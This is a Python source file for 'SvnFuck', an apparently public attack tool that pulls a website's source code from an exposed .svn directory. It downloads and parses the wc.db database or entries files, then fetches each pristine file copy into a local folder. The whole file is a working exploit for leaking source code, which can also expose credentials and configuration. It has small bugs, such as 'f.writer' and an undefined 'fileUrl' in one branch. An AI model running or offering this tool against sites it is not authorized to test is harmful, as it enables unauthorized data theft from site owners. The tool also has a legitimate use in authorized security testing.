# -*- coding: utf-8 -*-

import requests
import sqlite3,os,re,sys
from lib.util import cprint,rmakedirs,calcSize,rdir,header
import time

class SvnFuck(object):
    
    __AUTHOR__ = 'Xenny'
    __SVN_HOST = ''
    __FILE_PATH = ''
    
    def __init__(self, host):
        self.logo()
        self.__SVN_HOST = self.resolveHost(host)
        self.__FILE_PATH = self.makeFilePath()
        return

    def logo(self):
        print("""
     ____             _____           _    
    / ___|_   ___ __ |  ___|   _  ___| | __
    \___ \ \ / / '_ \| |_ | | | |/ __| |/ /
     ___) \ V /| | | |  _|| |_| | (__|   < 
    |____/ \_/ |_| |_|_|   \__,_|\___|_|\_\\

    Author: Xenny
    https://github.com/X3NNY/SvnFuck
    """)
        return
    
    def resolveHost(self,host):
        '''Resolve address entered by user'''
        host = host.strip()
        #reg = re.compile(r'(?:http(?:s?):\/\/)?(?:[\w-]+\.)+(?:\w+)(?::\d+)?/?')
        #hosts = reg.findall(host)
        #if len(hosts) == 0:
        #    cprint('[!] Host Error, Please input correct host address.', 'red')
        #    cprint('[-] Your input:{}'.format(host),'red')
        #    sys.exit()
        #host = hosts[0]
        host = host[:host.index('.svn')]
        if not host.startswith('http'):
            host = 'http://'+host
        if not host.endswith('/'):
            host = host+'/'
        return host
    
    def makeFilePath(self):
        '''Create date directory'''
        reg = re.compile(r'(?:[\w-]+\.)+(?:\w+)')
        path = reg.findall(self.__SVN_HOST)[0]
        if not os.path.exists('data'):
            os.makedirs('data')
        date = int(time.time())
        os.makedirs('data/{}_{}'.format(path,date))
        return os.path.abspath('data/{}_{}'.format(path,date))+'/'
    
    def downloadWc_db(self):
        '''Download wc.db'''
        dbUrl = self.__SVN_HOST+".svn/wc.db"
        res = requests.get(dbUrl,headers=header)
        
        if res.status_code != 200:
            cprint('[!] Download Error: HTTP Status {} Error.'.format(res.status_code),'red')
            cprint('[-] Please check if {} is accessible.'.format(dbUrl),'red')
            sys.exit()
        
        with open(self.__FILE_PATH+'wb.db','wb+') as f:
            f.write(res.content)
        return
    
    def resolveWc_db(self):
        '''
            @return: [(path,kind,checksum,size)]
        '''
        path = self.__FILE_PATH+'wb.db'
        res = []
        try:
            conn = sqlite3.connect(path)
            cur = conn.cursor()
            cur.execute('select checksum,size from main.PRISTINE')
            pristine = cur.fetchall()
            cur.close()
            cur = conn.cursor()
            cur.execute('select local_relpath,kind,checksum from main.NODES')
            nodes = cur.fetchall()
            cur.close()
            conn.close()
            tp = {}
            for i in pristine:
                tp[i[0]] = i[1]
            
            for i in nodes:
                if i[2] != None and i[2] in tp:
                    res.append((i[0],i[1],i[2],tp.pop(i[2])))
                else:
                    res.append((i[0],i[1],i[2],0))
            
            for i in tp:
                res.append(('Unkown_'+i,'file',i,tp[i]))
        except BaseException as e:
            print(e)
            cprint('[-] Open {} failed.'.format(path),'red')
        return res
    
    def downFile(self,task):
        '''Download file from server'''
        if self.flag:
            path = self.__FILE_PATH
            if task[1] == 'dir':
                rmakedirs(path+task[0])
            else:
                if task[2] == None:
                    # file was been deleted.
                    with open(path+task[0]+'(deleted)','wb+') as f:
                        pass
                    cprint('[+] Found a deleted file. Name:{}'.format(task[0]),'green')
                    return
                # checksum = $sha1$xx...
                checksum = task[2][6:]
                fileUrl = self.__SVN_HOST+'.svn/pristine/'+checksum[:2]+'/'+checksum+'.svn-base'
                
                try:
                    r = requests.get(fileUrl,headers=header)
                    
                    if r.status_code != 200:
                        raise BaseException('HTTP status isn\'t 200')
                except:
                    # Download file failed
                    cprint('[-] Download {} Failed.Url:{}'.format(task[0],fileUrl),'red')
                    return
                fpath = os.path.join(path,task[0])
                try:
                    os.makedirs(os.path.dirname(fpath))
                except:
                    pass
                with open(fpath,'wb+') as f:
                    f.write(r.content)
                size = calcSize(int(task[3]))
                cprint('[+] Download {} Success. File size {}'.format(task[0],size),'green')
        else:
            try:
                r = requests.get(task[0],headers=header)
    
                if r.status_code != 200:
                    raise BaseException('HTTP status isn\'t 200')
            except:
                # Download file failed
                cprint('[-] Download {} Failed.Url:{}'.format(task[0],fileUrl),'red')
                return
            with open(self.__FILE_PATH+task[1],'wb+') as f:
                f.writer(r.content)
            size = calcSize(len(r.content))
            cprint('[+] Download {} Success. File size {}'.format(task[0],size),'green')
            
        return
    
    def svnVersion(self):
        '''
            @return: True if version > 1.7, False for others
        '''
        url = self.__SVN_HOST+'.svn/entries'
        res = requests.get(url,headers=header)
        rmakedirs(self.__FILE_PATH+'.svn/')
        with open(self.__FILE_PATH+'.svn/entries','wb+') as f:
            f.write(res.content)
    
        if res.status_code != 200:
            cprint('[!] Download Error: HTTP Status {} Error.'.format(res.status_code),'red')
            cprint('[-] Please check if {} is accessible.'.format(url),'red')
            sys.exit()
        if res.content == b'12\n':
            return True
        return False
            
    
    def resolveEntries(self,url,pre=''):
        '''Recursively parse /.svn/entries to get all file paths'''
        r = requests.get(url,headers=header)
        lists = r.text.split('\n')
        for task,i in zip(lists,range(len(lists))):
            if task == 'file':
                if lists[i-1]:
                    if pre:
                        self.downFile((self.__SVN_HOST+pre+'/.svn/text-base/'+lists[i-1]+'.svn-base',pre+'/'+lists[i-1]))
                    else:
                        self.downFile((self.__SVN_HOST+'/.svn/text-base/'+lists[i-1]+'.svn-base',lists[i-1]))
            elif task == 'dir':
                if lists[i-1]:
                    if pre:
                        rmakedirs(self.__FILE_PATH+pre+'/'+lists[i-1])
                        self.resolveEntries(self.__SVN_HOST+pre+'/'+lists[i-1]+'/.svn/entries',pre+'/'+lists[i-1])
                    else:
                        rmakedirs(self.__FILE_PATH+lists[i-1])
                        self.resolveEntries(self.__SVN_HOST+lists[i-1]+'/.svn/entries',lists[i-1])
        return
                        
    
    def downAllFile(self):
        rmakedirs(self.__FILE_PATH+'.svn/')
        rdir(self.__SVN_HOST+'.svn/',self.__FILE_PATH+'.svn/')
    
    def toFuck(self):
        '''Start'''
        self.flag = self.svnVersion()
        if self.flag:
            self.downloadWc_db()
            lists = self.resolveWc_db()
            for i in lists:
                self.downFile(i)
        else:
            self.resolveEntries(self.__SVN_HOST+'.svn/entries')
        cprint('[+] All file downloads completed.','blue')
        cprint('[?] Do you want to continue downloading all files under /.svn/ (Y/N)','yellow')
        flag = raw_input().strip().lower()
        if flag == 'y' or flag == 'yes':
            cprint('[+] Start downloading...Please wait on.','cyan')
            self.downAllFile()
            cprint('[+] All file downloads comleted.','blue')
        return

if __name__ == '__main__':
    if len(sys.argv) == 2:
        svnFuck = SvnFuck(sys.argv[1])
        svnFuck.toFuck()
    else:
        cprint('[!] Parameter Error, Please input correct parameters.', 'red')
        cprint('[-] Example: python {} http://example.com/.svn/'.format((sys.argv[0])), 'red')
